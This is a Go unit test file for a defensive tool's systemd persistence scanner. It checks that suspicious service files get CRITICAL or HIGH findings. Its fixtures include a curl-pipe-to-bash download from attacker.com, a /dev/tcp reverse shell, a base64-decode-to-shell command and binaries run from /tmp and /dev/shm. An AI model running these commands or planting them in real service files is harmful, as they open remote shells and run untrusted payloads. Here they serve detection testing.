package persistence_test

import (
	"context"
	"os"
	"path/filepath"
	"testing"

	"github.com/nunenuh/defense-kit/defense-kit-cli/internal/scanner"
	"github.com/nunenuh/defense-kit/defense-kit-cli/internal/scanner/persistence"
)

// ---- helpers ----

func writeServiceFile(t *testing.T, dir, name, content string) string {
	t.Helper()
	if err := os.MkdirAll(dir, 0o755); err != nil {
		t.Fatalf("failed to create dir %s: %v", dir, err)
	}
	path := filepath.Join(dir, name)
	if err := os.WriteFile(path, []byte(content), 0o644); err != nil {
		t.Fatalf("failed to write service file %s: %v", path, err)
	}
	return path
}

// ---- interface tests (already covered in persistence_test.go but kept for
//      completeness in this focused file) ----

func TestSystemdScanner_Interface_Detailed(t *testing.T) {
	s := persistence.NewSystemdScanner()

	if s.Name() != "systemd" {
		t.Errorf("Name() = %q, want %q", s.Name(), "systemd")
	}
	if s.Category() != "persistence" {
		t.Errorf("Category() = %q, want %q", s.Category(), "persistence")
	}
	if !s.RequiresRoot() {
		t.Error("RequiresRoot() should be true")
	}
	if !s.Available() {
		t.Error("Available() should be true")
	}
	if s.Description() == "" {
		t.Error("Description() should not be empty")
	}
}

// ---- functional tests ----

// TestSystemdScanner_CriticalExecInTmp verifies that a service whose ExecStart
// points to /tmp produces a CRITICAL finding.
func TestSystemdScanner_CriticalExecInTmp(t *testing.T) {
	const content = `[Unit]
Description=Backdoor Service

[Service]
ExecStart=/tmp/backdoor

[Install]
WantedBy=multi-user.target
`
	dir := t.TempDir()
	path := writeServiceFile(t, dir, "backdoor.service", content)

	findings := persistence.ScanSystemServiceForTest(path, false)

	assertHasSeverity(t, findings, scanner.SevCritical,
		"expected CRITICAL finding for ExecStart=/tmp/backdoor")
}

// TestSystemdScanner_CriticalPipeToShell verifies that a pipe-to-shell
// ExecStart produces a CRITICAL finding.
func TestSystemdScanner_CriticalPipeToShell(t *testing.T) {
	const content = `[Unit]
Description=Evil Downloader

[Service]
ExecStart=/bin/sh -c "curl http://attacker.com/payload.sh | bash"

[Install]
WantedBy=multi-user.target
`
	dir := t.TempDir()
	path := writeServiceFile(t, dir, "evil-dl.service", content)

	findings := persistence.ScanSystemServiceForTest(path, false)

	assertHasSeverity(t, findings, scanner.SevCritical,
		"expected CRITICAL finding for pipe-to-shell ExecStart")
}

// TestSystemdScanner_CriticalDevTcp verifies that /dev/tcp reverse-shell
// usage in ExecStart produces a CRITICAL finding.
func TestSystemdScanner_CriticalDevTcp(t *testing.T) {
	const content = `[Unit]
Description=Reverse Shell

[Service]
ExecStart=/bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1

[Install]
WantedBy=multi-user.target
`
	dir := t.TempDir()
	path := writeServiceFile(t, dir, "revshell.service", content)

	findings := persistence.ScanSystemServiceForTest(path, false)

	assertHasSeverity(t, findings, scanner.SevCritical,
		"expected CRITICAL finding for /dev/tcp reverse shell")
}

// TestSystemdScanner_HighBase64 verifies that base64 decoding in ExecStart
// produces at least a HIGH finding.
func TestSystemdScanner_HighBase64(t *testing.T) {
	const content = `[Unit]
Description=Obfuscated Service

[Service]
ExecStart=/bin/sh -c "echo aGVsbG8= | base64 -d | sh"

[Install]
WantedBy=multi-user.target
`
	dir := t.TempDir()
	path := writeServiceFile(t, dir, "obfuscated.service", content)

	findings := persistence.ScanSystemServiceForTest(path, false)

	assertHasMinSeverity(t, findings, scanner.SevHigh,
		"expected >= HIGH finding for base64 decode in ExecStart")
}

// TestSystemdScanner_DropInOverrideExecStart verifies that a drop-in conf
// file that modifies ExecStart produces a HIGH finding.
func TestSystemdScanner_DropInOverrideExecStart(t *testing.T) {
	const content = `[Service]
ExecStart=
ExecStart=/usr/local/bin/legitimate-override
`
	dir := t.TempDir()
	dropInDir := filepath.Join(dir, "sshd.service.d")
	path := writeServiceFile(t, dropInDir, "override.conf", content)

	findings := persistence.ScanDropInForTest(path)

	if len(findings) == 0 {
		t.Fatal("expected findings for drop-in ExecStart override, got none")
	}
	assertHasMinSeverity(t, findings, scanner.SevHigh,
		"expected >= HIGH finding for drop-in ExecStart override")
}

// TestSystemdScanner_DropInNoExecStart verifies that a drop-in without an
// ExecStart modification produces no findings.
func TestSystemdScanner_DropInNoExecStart(t *testing.T) {
	const content = `[Service]
Restart=on-failure
RestartSec=5
`
	dir := t.TempDir()
	dropInDir := filepath.Join(dir, "sshd.service.d")
	path := writeServiceFile(t, dropInDir, "restart.conf", content)

	findings := persistence.ScanDropInForTest(path)

	if len(findings) != 0 {
		t.Errorf("expected 0 findings for drop-in with no ExecStart, got %d: %+v", len(findings), findings)
	}
}

// TestSystemdScanner_CleanService verifies that a normal, benign service
// produces no findings (dpkg check disabled).
func TestSystemdScanner_CleanService(t *testing.T) {
	const content = `[Unit]
Description=My Legitimate Service
After=network.target

[Service]
Type=simple
User=nobody
ExecStart=/usr/bin/myapp --config /etc/myapp/config.yaml
Restart=on-failure

[Install]
WantedBy=multi-user.target
`
	dir := t.TempDir()
	path := writeServiceFile(t, dir, "myapp.service", content)

	findings := persistence.ScanSystemServiceForTest(path, false)

	if len(findings) != 0 {
		t.Errorf("expected 0 findings for clean service, got %d: %+v", len(findings), findings)
	}
}

// TestSystemdScanner_ExecStartPre verifies that suspicious content in
// ExecStartPre is also caught.
func TestSystemdScanner_ExecStartPre(t *testing.T) {
	const content = `[Unit]
Description=Service With Suspicious Pre Hook

[Service]
ExecStartPre=/tmp/setup.sh
ExecStart=/usr/bin/myapp

[Install]
WantedBy=multi-user.target
`
	dir := t.TempDir()
	path := writeServiceFile(t, dir, "pre-hook.service", content)

	findings := persistence.ScanSystemServiceForTest(path, false)

	assertHasSeverity(t, findings, scanner.SevCritical,
		"expected CRITICAL finding for ExecStartPre=/tmp/setup.sh")
}

// TestSystemdScanner_DevShmExec verifies that ExecStart from /dev/shm
// produces a CRITICAL finding.
func TestSystemdScanner_DevShmExec(t *testing.T) {
	const content = `[Unit]
Description=In-Memory Payload

[Service]
ExecStart=/dev/shm/payload

[Install]
WantedBy=multi-user.target
`
	dir := t.TempDir()
	path := writeServiceFile(t, dir, "shm.service", content)

	findings := persistence.ScanSystemServiceForTest(path, false)

	assertHasSeverity(t, findings, scanner.SevCritical,
		"expected CRITICAL finding for ExecStart=/dev/shm/payload")
}

// TestSystemdScanner_ScanContextAndOptions verifies that Scan() with default
// options does not return an error (files simply won't exist in CI).
func TestSystemdScanner_ScanContextAndOptions(t *testing.T) {
	s := persistence.NewSystemdScanner()
	findings, err := s.Scan(context.Background(), scanner.ScanOptions{})
	if err != nil {
		t.Fatalf("Scan returned unexpected error: %v", err)
	}
	_ = findings
}

// TestSystemdScanner_FindingFields verifies that all required Finding fields
// are populated for a suspicious service.
func TestSystemdScanner_FindingFields(t *testing.T) {
	const content = `[Unit]
Description=Backdoor

[Service]
ExecStart=/tmp/evil

[Install]
WantedBy=multi-user.target
`
	dir := t.TempDir()
	path := writeServiceFile(t, dir, "evil.service", content)

	findings := persistence.ScanSystemServiceForTest(path, false)

	if len(findings) == 0 {
		t.Fatal("expected at least one finding, got none")
	}
	for _, f := range findings {
		if f.ID == "" {
			t.Error("finding.ID is empty")
		}
		if f.Scanner != "systemd" {
			t.Errorf("finding.Scanner = %q, want %q", f.Scanner, "systemd")
		}
		if f.Title == "" {
			t.Error("finding.Title is empty")
		}
		if f.Detail == "" {
			t.Error("finding.Detail is empty")
		}
		if f.Location == "" {
			t.Error("finding.Location is empty")
		}
		if f.Remediation == "" {
			t.Error("finding.Remediation is empty")
		}
	}
}

// ---- assertion helpers ----

func assertHasSeverity(t *testing.T, findings []scanner.Finding, want scanner.Severity, msg string) {
	t.Helper()
	for _, f := range findings {
		if f.Severity == want {
			return
		}
	}
	t.Errorf("%s — severities found: %v", msg, severityList(findings))
}

func assertHasMinSeverity(t *testing.T, findings []scanner.Finding, min scanner.Severity, msg string) {
	t.Helper()
	for _, f := range findings {
		if f.Severity >= min {
			return
		}
	}
	t.Errorf("%s — severities found: %v", msg, severityList(findings))
}

func severityList(findings []scanner.Finding) []string {
	var out []string
	for _, f := range findings {
		out = append(out, f.Severity.String())
	}
	return out
}
